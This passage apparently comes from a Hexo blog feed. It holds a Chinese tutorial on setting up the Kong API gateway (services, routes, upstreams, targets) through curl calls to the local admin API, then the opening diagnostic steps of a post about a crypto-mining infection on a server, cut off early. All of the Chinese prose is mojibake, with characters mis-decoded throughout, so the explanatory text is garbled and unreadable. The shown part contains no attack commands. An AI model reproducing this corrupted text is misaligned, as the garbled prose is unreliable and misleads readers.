å°†åŸŸåapi.example.comå’Œapi.service.comçš„è¯·æ±‚è½¬åˆ°åˆ°æˆ‘ä»¬çš„KongæœåŠ¡å™¨çš„å‰é¢çš„è´Ÿè½½å‡è¡¡è°ƒåº¦å™¨ä¸Š</span><br><span class="line"></span><br><span class="line">é‚£ä¹ˆï¼Œå½“æˆ‘ä»¬è¯·æ±‚api.example.com/loginå’Œapi.service.com/loginæ—¶ï¼Œå…¶é€šè¿‡RouteåŒ¹é…ï¼Œç„¶åè½¬å‘åˆ°Serviceï¼Œæœ€ç»ˆå°†ä¼šè¯·æ±‚æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡ã€‚</span><br></pre></td></tr></table></figure><hr><h4 id="upstream"><a href="#upstream" class="headerlink" title="* upstream"></a>* upstream</h4><p>å’Œnginxçš„upstreamæ¦‚å¿µä¸€æ¨¡ä¸€æ ·..è¿™æ˜¯æŒ‡æ‚¨è‡ªå·±çš„åç«¯çœŸå®æœåŠ¡å™¨ä½äºKongåé¢ï¼Œå®¢æˆ·ç«¯è¯·æ±‚è¢«è½¬å‘åˆ°è¯¥æœåŠ¡å™¨ã€‚<br>ç›¸å½“äºKongæä¾›äº†ä¸€ä¸ªè´Ÿè½½çš„åŠŸèƒ½ï¼ŒåŸºäºNginxçš„è™šæ‹Ÿä¸»æœºçš„æ–¹å¼åšçš„è´Ÿè½½åŠŸèƒ½</p><p>å½“æˆ‘ä»¬éƒ¨ç½²é›†ç¾¤æ—¶ï¼Œä¸€ä¸ªå•ç‹¬çš„åœ°å€ä¸è¶³ä»¥æ»¡è¶³æˆ‘ä»¬çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Kongçš„upstreamæ¥è¿›è¡Œè®¾ç½®</p><p>upstreamçš„åŠŸèƒ½å’Œnginxä¹Ÿç±»ä¼¼,å¯ä»¥æŒ‡å®šåç«¯çœŸå®çš„targetæœåŠ¡å™¨.è¿˜æä¾›å¥åº·æ£€æŸ¥æœºåˆ¶</p><hr><h4 id="target"><a href="#target" class="headerlink" title="* target"></a>* target</h4><p>target å°±æ˜¯åœ¨upstreamè¿›è¡Œè´Ÿè½½å‡è¡¡çš„ç»ˆç«¯ï¼Œå½“æˆ‘ä»¬éƒ¨ç½²é›†ç¾¤æ—¶ï¼Œéœ€è¦å°†æ¯ä¸ªèŠ‚ç‚¹ä½œä¸ºä¸€ä¸ªtargetï¼Œå¹¶è®¾ç½®è´Ÿè½½çš„æƒé‡ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡upstreamçš„è®¾ç½®å¯¹targetè¿›è¡Œå¥åº·æ£€æŸ¥ã€‚<br>â€‹<br>å½“æˆ‘ä»¬ä½¿ç”¨upstreamæ—¶ï¼Œæ•´ä¸ªè·¯çº¿æ˜¯ Route &gt;&gt; Service &gt;&gt; Upstream &gt;&gt; Target </p><hr><h4 id="api"><a href="#api" class="headerlink" title="* api"></a>* api</h4><p>ç”¨äºè¡¨ç¤ºæ‚¨çš„ä¸Šæ¸¸æœåŠ¡çš„ä¼ ç»Ÿå®ä½“ã€‚è‡ª0.13.0èµ·å·²ç»è¢«å¼ƒç”¨ã€‚</p><hr><h4 id="consumer"><a href="#consumer" class="headerlink" title="* consumer"></a>* consumer</h4><p>Consumer å¯ä»¥ä»£è¡¨ä¸€ä¸ªæœåŠ¡ï¼Œå¯ä»¥ä»£è¡¨ä¸€ä¸ªç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥ä»£è¡¨æ¶ˆè´¹è€…ï¼Œå¯ä»¥æ ¹æ®æˆ‘ä»¬è‡ªå·±çš„éœ€æ±‚æ¥å®šä¹‰</p><p>å¯ä»¥å°†ä¸€ä¸ªConsumerå¯¹åº”åˆ°å®é™…åº”ç”¨ä¸­çš„ä¸€ä¸ªç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥åªæ˜¯ä½œä¸ºä¸€ä¸ªServiceçš„è¯·æ±‚æ¶ˆè´¹è€…</p><hr><h4 id="plugin"><a href="#plugin" class="headerlink" title="* plugin"></a>* plugin</h4><p>kongå®˜æ–¹æä¾›äº†å„ç§å„æ ·çš„æ’ä»¶,æ¯”å¦‚é™æµ,è®¤è¯,ç­¾å,httpè¿œç¨‹æ—¥å¿—ç­‰..è¿™äº›æ’ä»¶åœ¨è¯·æ±‚è¢«ä»£ç†åˆ°ä¸Šæ¸¸APIä¹‹å‰æˆ–ä¹‹åæ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œè¯·æ±‚ä¹‹å‰çš„Authenticationæˆ–è€…æ˜¯è¯·æ±‚é™æµæ’ä»¶çš„ä½¿ç”¨</p><p>Pluginå¯ä»¥å’ŒServiceç»‘å®šï¼Œä¹Ÿå¯ä»¥å’ŒRouteä»¥åŠConsumerè¿›è¡Œå…³è”ã€‚å½“å’Œä¸åŒçš„kongç»„ä»¶è¿›è¡Œç»‘å®šæ—¶,æ’ä»¶çš„ä½œç”¨èŒƒå›´ä¹Ÿä¸åŒ.</p><hr><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>å®˜æ–¹æä¾›äº†è¯¦ç»†çš„é…ç½®å‚æ•° <a href="https://docs.konghq.com/0.14.x/admin-api/#add-service" target="_blank" rel="noopener">admin api</a></p><p>å¯ä»¥é€šè¿‡curlå‘½ä»¤è¡Œæ¥é…ç½®å„ä¸ªAPIç»„ä»¶,ä¹Ÿå¯ä»¥é€šè¿‡kong-dashboardçš„UIç•Œé¢é…ç½®.è¿™é‡Œæ¼”ç¤ºå‘½ä»¤è¡Œçš„é…ç½®æ–¹æ³•</p><h4 id="serviceé…ç½®"><a href="#serviceé…ç½®" class="headerlink" title="* serviceé…ç½®"></a>* serviceé…ç½®</h4><p>ä¸‹é¢çš„ä¾‹å­ä¸­æ³¨å†Œä¸€ä¸ªservice.åå­—æ˜¯betaapi,åè®®æ˜¯http.ä¸»æœºæ˜¯ä¸Šæ¸¸çš„upstreamåç«¯æœåŠ¡å™¨ç»„:beta_background_server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">work@DWD-BETA conf]$ curl  -X POST --url http://localhost:8001/services/ \</span><br><span class="line">&gt; --data &apos;name=betaapi&apos; \</span><br><span class="line">&gt; --data &apos;protocol=http&apos; \</span><br><span class="line">&gt; --data &apos;host=beta_background_server&apos;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ</p><p>åŒ…å«çš„ä¿¡æ¯æœ‰åˆ›å»ºæ—¶é—´,serviceè¿™ä¸ªapiç»„ä»¶çš„ID.ä»¥åŠä¸€äº›é»˜è®¤å‚æ•°,æ¯”å¦‚retries,write_timeout</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;host&quot;:&quot;beta_background_server&quot;,</span><br><span class="line">    &quot;created_at&quot;:1541230207,</span><br><span class="line">    &quot;connect_timeout&quot;:60000,</span><br><span class="line">    &quot;id&quot;:&quot;bb45687e-7cf5-48b2-b3ae-6847e28736bf&quot;,</span><br><span class="line">    &quot;protocol&quot;:&quot;http&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;betaapi&quot;,</span><br><span class="line">    &quot;read_timeout&quot;:60000,</span><br><span class="line">    &quot;port&quot;:80,</span><br><span class="line">    &quot;path&quot;:null,</span><br><span class="line">    &quot;updated_at&quot;:1541230207,</span><br><span class="line">    &quot;retries&quot;:5,</span><br><span class="line">    &quot;write_timeout&quot;:60000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹serviceé…ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA conf]$ curl -i -X GET http://localhost:8001/services</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 03 Nov 2018 07:54:25 GMT</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Server: kong/0.14.1</span><br><span class="line">Content-Length: 285</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;next&quot;:null,</span><br><span class="line">    &quot;data&quot;:[</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;host&quot;:&quot;beta_background_server&quot;,</span><br><span class="line">            &quot;created_at&quot;:1541230207,</span><br><span class="line">            &quot;connect_timeout&quot;:60000,</span><br><span class="line">            &quot;id&quot;:&quot;bb45687e-7cf5-48b2-b3ae-6847e28736bf&quot;,</span><br><span class="line">            &quot;protocol&quot;:&quot;http&quot;,</span><br><span class="line">            &quot;name&quot;:&quot;betaapi&quot;,</span><br><span class="line">            &quot;read_timeout&quot;:60000,</span><br><span class="line">            &quot;port&quot;:80,</span><br><span class="line">            &quot;path&quot;:null,</span><br><span class="line">            &quot;updated_at&quot;:1541230207,</span><br><span class="line">            &quot;retries&quot;:5,</span><br><span class="line">            &quot;write_timeout&quot;:60000</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®å¯ä»¥ä½¿ç”¨PATCHæ–¹æ³•,ä¾‹å¦‚å°†serviceçš„åå­—ä¿®æ”¹ä¸ºBETA</p><p>ä¿®æ”¹çš„æ—¶å€™éœ€è¦æŒ‡å®šè¦ä¿®æ”¹çš„serviceæˆ–è€…routeç­‰ç»„ä»¶çš„ID.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X PATCH http://localhost:8001/services/bb45687e-7cf5-48b2-b3ae-6847e28736bf/ \</span><br><span class="line">&gt; --data &apos;name=beta&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;host&quot;:&quot;beta_background_server&quot;,&quot;created_at&quot;:1541230207,&quot;connect_timeout&quot;:60000,&quot;id&quot;:&quot;bb45687e-7cf5-48b2-b3ae-6847e28736bf&quot;,&quot;protocol&quot;:&quot;http&quot;,&quot;name&quot;:&quot;beta&quot;,&quot;read_timeout&quot;:60000,&quot;port&quot;:80,&quot;path&quot;:null,&quot;updated_at&quot;:1541231842,&quot;retries&quot;:5,&quot;write_timeout&quot;:60000&#125;</span><br></pre></td></tr></table></figure><h4 id="routeé…ç½®"><a href="#routeé…ç½®" class="headerlink" title="* routeé…ç½®"></a>* routeé…ç½®</h4><p>routeå®šä¹‰ä¸ºè®¿é—®æŸä¸ªæœåŠ¡çš„è·¯å¾„,ç±»ä¼¼äºç½‘ç»œè®¾å¤‡ä¸­çš„è·¯ç”±çš„æ¦‚å¿µ,å®ƒå®šä¹‰äº†è®¿é—®æŸä¸ªæœåŠ¡æˆ–è€…åŸŸå(ç›®çš„åœ°)æ—¶,è½¬äº¤ç»™æŸä¸ªserviceç»„ä»¶(ç±»ä¼¼äºä¸‹ä¸€è·³).</p><p>ä¾‹å¦‚:è®¿é—®m.betaapi.haoshiqi.netçš„è¯·æ±‚å°±è½¬äº¤ç»™åˆšæ‰å®šä¹‰çš„service</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA conf]$ curl -X POST --url http://localhost:8001/routes/ \</span><br><span class="line">&gt; --data &apos;service.id=bb45687e-7cf5-48b2-b3ae-6847e28736bf&apos; \</span><br><span class="line">&gt; --data &apos;protocols[]=http&apos; \</span><br><span class="line">&gt; --data &apos;protocols[]=https&apos; \</span><br><span class="line">&gt; --data &apos;methods[]=GET&amp;methods[]=POST&apos; \</span><br><span class="line">&gt; --data &apos;hosts[]=m.betaapi.haoshiqi.net&apos;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘åªå®šä¹‰äº†methodså’Œprotocols.æ²¡æœ‰å®šä¹‰path.è¿™3ä¸ªå‚æ•°å¿…é¡»æŒ‡å®šä¸€ä¸ª.å®ƒè¡¨ç¤ºäº†è®¿é—®ç›®çš„æœåŠ¡(m.betaapi.haoshiqi.net)çš„æ–¹æ³•å’Œåè®®,æˆ–è€…å…·ä½“è·¯å¾„.</p><p>æˆ‘ä½¿ç”¨äº†2ç§å†™æ³•:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--data &apos;protocols[]=http&apos; \</span><br><span class="line">--data &apos;protocols[]=https&apos; \</span><br></pre></td></tr></table></figure><p>å’Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methods[]=GET&amp;methods[]=POST&apos;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;created_at&quot;:1541232959,</span><br><span class="line">    &quot;strip_path&quot;:true,</span><br><span class="line">    &quot;hosts&quot;:[</span><br><span class="line">        &quot;m.betaapi.haoshiqi.net&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;preserve_host&quot;:false,</span><br><span class="line">    &quot;regex_priority&quot;:0,</span><br><span class="line">    &quot;updated_at&quot;:1541232959,</span><br><span class="line">    &quot;paths&quot;:null,</span><br><span class="line">    &quot;service&quot;:&#123;</span><br><span class="line">        &quot;id&quot;:&quot;bb45687e-7cf5-48b2-b3ae-6847e28736bf&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;methods&quot;:[</span><br><span class="line">        &quot;GET&quot;,</span><br><span class="line">        &quot;POST&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;protocols&quot;:[</span><br><span class="line">        &quot;http&quot;,</span><br><span class="line">        &quot;https&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;id&quot;:&quot;d4f02c14-0482-472c-9a4f-04361dd5f579&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯å®šä¹‰äº†paths:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA plugins]$ curl -i -XPOST --url http://localhost:8001/routes/ --data &apos;protocols[]=http&apos; --data &apos;protocols[]=https&apos; --data &apos;methods[]=GET&amp;methods[]=POST&apos; --data &apos;paths[]=/merchantapi&apos; --data &apos;hosts[]=m.betapai.haoshiqi.net&apos; --data &apos;service.id=bb45687e-7cf5-48b2-b3ae-6847e28736bf&apos;</span><br><span class="line">HTTP/1.1 201 Created</span><br><span class="line">Date: Wed, 07 Nov 2018 10:26:00 GMT</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Server: kong/0.14.1</span><br><span class="line">Content-Length: 324</span><br><span class="line"></span><br><span class="line">&#123;&quot;created_at&quot;:1541586360,&quot;strip_path&quot;:true,&quot;hosts&quot;:[&quot;m.betapai.haoshiqi.net&quot;],&quot;preserve_host&quot;:false,&quot;regex_priority&quot;:0,&quot;updated_at&quot;:1541586360,&quot;paths&quot;:[&quot;\/merchantapi&quot;],&quot;service&quot;:&#123;&quot;id&quot;:&quot;bb45687e-7cf5-48b2-b3ae-6847e28736bf&quot;&#125;,&quot;methods&quot;:[&quot;GET&quot;,&quot;POST&quot;],&quot;protocols&quot;:[&quot;http&quot;,&quot;https&quot;],&quot;id&quot;:&quot;a2bb14fd-6423-45bb-be60-5481bc5a3038&quot;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>routeçš„hostså­—æ®µä¸ä»…å¯ä»¥æŒ‡å®šå…·ä½“çš„åŸŸå,è¿˜å¯ä»¥é…ç½®é€šé…ç¬¦åŸŸå,æˆ–è€…æ›´é«˜çº§çš„æ­£åˆ™å†™æ³•.</p></blockquote><hr><h4 id="upstreamé…ç½®"><a href="#upstreamé…ç½®" class="headerlink" title="* upstreamé…ç½®"></a>* upstreamé…ç½®</h4><p>upstreamçš„åå­—åº”è¯¥è¦å’Œserviceçš„hoståŒ¹é…</p><p>å¯ä»¥çœ‹åˆ°å®šä¹‰upstreamæ—¶,kongæä¾›äº†å¾ˆå¤šé»˜è®¤å‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA conf]$ curl -X POST --url http://localhost:8001/upstreams/ --data &apos;name=beta_background_server&apos;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;healthchecks&quot;:&#123;</span><br><span class="line">        &quot;active&quot;:&#123;</span><br><span class="line">            &quot;unhealthy&quot;:&#123;</span><br><span class="line">                &quot;http_statuses&quot;:[</span><br><span class="line">                    429,</span><br><span class="line">                    404,</span><br><span class="line">                    500,</span><br><span class="line">                    501,</span><br><span class="line">                    502,</span><br><span class="line">                    503,</span><br><span class="line">                    504,</span><br><span class="line">                    505</span><br><span class="line">                ],</span><br><span class="line">                &quot;tcp_failures&quot;:0,</span><br><span class="line">                &quot;timeouts&quot;:0,</span><br><span class="line">                &quot;http_failures&quot;:0,</span><br><span class="line">                &quot;interval&quot;:0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;http_path&quot;:&quot;/&quot;,</span><br><span class="line">            &quot;healthy&quot;:&#123;</span><br><span class="line">                &quot;http_statuses&quot;:[</span><br><span class="line">                    200,</span><br><span class="line">                    302</span><br><span class="line">                ],</span><br><span class="line">                &quot;interval&quot;:0,</span><br><span class="line">                &quot;successes&quot;:0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;timeout&quot;:1,</span><br><span class="line">            &quot;concurrency&quot;:10</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;passive&quot;:&#123;</span><br><span class="line">            &quot;unhealthy&quot;:&#123;</span><br><span class="line">                &quot;http_failures&quot;:0,</span><br><span class="line">                &quot;http_statuses&quot;:[</span><br><span class="line">                    429,</span><br><span class="line">                    500,</span><br><span class="line">                    503</span><br><span class="line">                ],</span><br><span class="line">                &quot;tcp_failures&quot;:0,</span><br><span class="line">                &quot;timeouts&quot;:0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;healthy&quot;:&#123;</span><br><span class="line">                &quot;successes&quot;:0,</span><br><span class="line">                &quot;http_statuses&quot;:[</span><br><span class="line">                    200,</span><br><span class="line">                    201,</span><br><span class="line">                    202,</span><br><span class="line">                    203,</span><br><span class="line">                    204,</span><br><span class="line">                    205,</span><br><span class="line">                    206,</span><br><span class="line">                    207,</span><br><span class="line">                    208,</span><br><span class="line">                    226,</span><br><span class="line">                    300,</span><br><span class="line">                    301,</span><br><span class="line">                    302,</span><br><span class="line">                    303,</span><br><span class="line">                    304,</span><br><span class="line">                    305,</span><br><span class="line">                    306,</span><br><span class="line">                    307,</span><br><span class="line">                    308</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;created_at&quot;:1541233739783,</span><br><span class="line">    &quot;hash_on&quot;:&quot;none&quot;,</span><br><span class="line">    &quot;id&quot;:&quot;111dbaf7-0283-49ae-958e-7146ee0e4e33&quot;,</span><br><span class="line">    &quot;hash_on_cookie_path&quot;:&quot;/&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;beta_background_server&quot;,</span><br><span class="line">    &quot;hash_fallback&quot;:&quot;none&quot;,</span><br><span class="line">    &quot;slots&quot;:10000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="targeté…ç½®"><a href="#targeté…ç½®" class="headerlink" title="*targeté…ç½®"></a>*targeté…ç½®</h4><p>å®šä¹‰targetæ—¶éœ€è¦æŒ‡å®šupstreamsç»„ä»¶è·¯å¾„ä¸‹,è€Œä¸”éœ€è¦æŒ‡å®šåœ¨å“ªä¸ªupstreamçš„IDä¸‹é…ç½®targets.</p><blockquote><p>æ³¨æ„:åç«¯çš„targetçœŸå®æœåŠ¡å™¨æ— è®ºæ˜¯åŸŸåè¿˜æ˜¯IPåœ°å€,éƒ½éœ€è¦æŒ‡å®šç«¯å£å·,é»˜è®¤ç«¯å£å·æ˜¯8000</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA conf]$ curl -X POST --url http://localhost:8001/upstreams/111dbaf7-0283-49ae-958e-7146ee0e4e33/targets --data &apos;target=kong.beta.haoshiqi.net:80&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;created_at&quot;:1541234259931,</span><br><span class="line">    &quot;id&quot;:&quot;a40fb1b5-a739-4de7-8208-9eaa52c03c5e&quot;,</span><br><span class="line">    &quot;upstream_id&quot;:&quot;111dbaf7-0283-49ae-958e-7146ee0e4e33&quot;,</span><br><span class="line">    &quot;target&quot;:&quot;kong.beta.haoshiqi.net:80&quot;,</span><br><span class="line">    &quot;weight&quot;:100</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘å®šä¹‰çš„targetçœŸå®æœåŠ¡å™¨æ˜¯kong.beata.haoshiqi.net.è¿™æ ·ä¸€æ¥è®¿é—®m.betaapi.haoshiqi.netåŸŸåç»è¿‡routesç»„ä»¶è½¬äº¤ç»™servicesç»„ä»¶.ç„¶åservicesåä»£åˆ°upstreamsé‡Œçš„çœŸå®targetæœåŠ¡å™¨.æœ€ç»ˆå°†è¯·æ±‚è½¬äº¤åˆ°kong.beta.haoshiqi.netæœåŠ¡å™¨</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;kong-APIç½‘å…³ä»‹ç»åŠAPIæ¥å£é…ç½®&quot;&gt;&lt;a href=&quot;#kong-APIç½‘å…³ä»‹ç»åŠAPIæ¥å£é…ç½®&quot; class=&quot;headerlink&quot; title=&quot;kong APIç½‘å…³ä»‹ç»åŠAPIæ¥å£é…ç½®&quot;&gt;&lt;/a&gt;kong APIç½‘å…³ä»‹ç»åŠAPIæ¥å£é…ç½®&lt;/h2&gt;&lt;p&gt;ä¸Šä¸€ç¯‡è®²è§£äº†kong+cassandraçš„éƒ¨ç½²å®‰è£…æ–¹æ³•.æ¥ä¸‹æ¥è®²è§£ä¸€ä¸‹kongçš„APIé…ç½®.å®˜ç½‘ä¸Šä¹Ÿæœ‰è¯¦ç»†çš„apiä»‹ç».&lt;/p&gt;
&lt;p&gt;ä¸‹é¢ç®€å•è®²è§£ä¸€ä¸‹kongçš„å„ä¸ªapiç»„ä»¶:&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-åˆ†å¸ƒå¼&amp;æ¶ˆæ¯é˜Ÿåˆ—" scheme="https://jesse.top/categories/Linux-%E5%88%86%E5%B8%83%E5%BC%8F-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    
    
      <category term="kong" scheme="https://jesse.top/tags/kong/"/>
    
  </entry>
  
  <entry>
    <title>æœåŠ¡å™¨ä¸­æŒ–çŸ¿ç—…æ¯’</title>
    <link href="https://jesse.top/2018/10/19/Linux-Basic/Skills/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%AF%92+%E6%8C%96%E7%9F%BF+redis%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    <id>https://jesse.top/2018/10/19/Linux-Basic/Skills/æœåŠ¡å™¨ä¸­æ¯’+æŒ–çŸ¿+rediså®‰å…¨åŠ å›º/</id>
    <published>2018-10-19T04:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.284Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BETAæœåŠ¡å™¨ä¸­æ¯’æ¡ˆä¾‹"><a href="#BETAæœåŠ¡å™¨ä¸­æ¯’æ¡ˆä¾‹" class="headerlink" title="BETAæœåŠ¡å™¨ä¸­æ¯’æ¡ˆä¾‹"></a>BETAæœåŠ¡å™¨ä¸­æ¯’æ¡ˆä¾‹</h2><p>å‘¨æœ«å‘ç°å…¬å¸çš„BETAæœåŠ¡å™¨å ç”¨CPUéå¸¸éå¸¸é«˜.åˆ©ç”¨htopæŸ¥çœ‹å‘ç°ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„è¿›ç¨‹å:ZXGcBt</p><p>ç¬¬ä¸€ç›´è§‰å°±æ˜¯æœåŠ¡å™¨å¯èƒ½é­å—äº†æ”»å‡»,è¢«æ¤å…¥äº†å¯ç–‘ç¨‹åº.</p><hr><h3 id="è§£å†³æ­¥éª¤"><a href="#è§£å†³æ­¥éª¤" class="headerlink" title="è§£å†³æ­¥éª¤:"></a>è§£å†³æ­¥éª¤:</h3><a id="more"></a><p>1.è¯•å›¾æ‰¾å‡ºè¯¥è¿›ç¨‹çš„çˆ¶è¿›ç¨‹:</p><p>ps -ef | grep -i ZXGcBt</p><p>ç»“æœæ˜¾ç¤ºçˆ¶è¿›ç¨‹ä¸º1.çœ‹æ¥æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹</p><p>2.é€šè¿‡è¯¥è¿›ç¨‹çš„PIDæ‰¾å‡ºè¯¥è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶,ä¹Ÿå°±æ˜¯ç¨‹åºçš„æ‰€åœ¨è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 